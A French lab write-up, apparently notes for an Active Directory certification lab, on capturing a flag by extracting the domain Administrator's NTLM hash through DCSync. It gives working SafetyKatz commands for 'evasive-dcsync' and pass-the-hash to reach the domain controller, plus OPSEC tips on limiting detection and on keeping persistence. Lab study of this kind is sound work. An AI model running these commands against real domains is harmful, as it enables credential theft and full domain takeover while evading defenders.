---
flag: 17
machine: dcorp-dc
statut: à faire
technique: DCSync
LO: "[[LO08 - DCSync et Golden ticket]]"
---
# F17 · NTLM du Domain Admin (Administrator)

> [!summary] Objectif
> Extraire le hash NTLM du compte `Administrator` (Domain Admin) de `dollarcorp.moneycorp.local` via DCSync.

## Contexte
- **Étape attack flow** : LO8 — même DCSync que F16, second user demandé (persistance credential-on-demand sur le compte DA principal).
- **Ce qu'on a** : TGT `svcadmin` (DA) → droits de réplication OK.
- **Ce qu'on cherche** : NTLM `Administrator` pour Pass-the-Hash direct sur le DC (survit à un reset de `krbtgt`, contrairement au Golden — voir [[Cheatsheet - Persistence]]).

## Solution

### Étape 1 : DCSync ciblé
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dollarcorp\Administrator" "exit"
```
→ Voir [[Cheatsheet - Persistence]] pour la mécanique / prérequis droits `DS-Replication-Get-Changes`.

### Étape 2 : rejeu Pass-the-Hash (validation)
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<A REMPLIR DEPUIS LAB> /run:powershell.exe" "exit"
# dans le shell qui s'ouvre :
dir \\dcorp-dc.dollarcorp.moneycorp.local\C$
```
→ Voir [[Cheatsheet - Lateral movement]] pour OverPass-the-Hash équivalent.

## Réponse

| Élément | Valeur |
|---------|--------|
| Administrator NTLM (`rc4_hmac`) | A REMPLIR DEPUIS LAB |
| Administrator AES256 (`aes256_hmac`) | A REMPLIR DEPUIS LAB |

## Pièges et OPSEC
- `Administrator` du **domaine** (`dollarcorp\Administrator`) ≠ `Administrator` **local** des boxes — le DCSync ne rend que le premier.
- PtH avec ce NTLM = accès DC sans jamais forger de ticket → plus discret qu'un Golden mais dépend de la rotation manuelle du mot de passe DA.
- Même trafic de réplication qu'en F16 (Event 4662, GUIDs replication) — dumper F16+F17 dans la **même** session DCSync limite le bruit.
- Sur des labs à jour, DA n'a pas de wdigest en clair — n'attendre que NTLM/AES.

## Refs
- [[Cheatsheet - Persistence]]
- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Tickets Kerberos]]
- [[LO08 - DCSync et Golden ticket]]
- [[F16 - NTLM de krbtgt]]

[[Flags - Index]] · [[Journal - Index]]
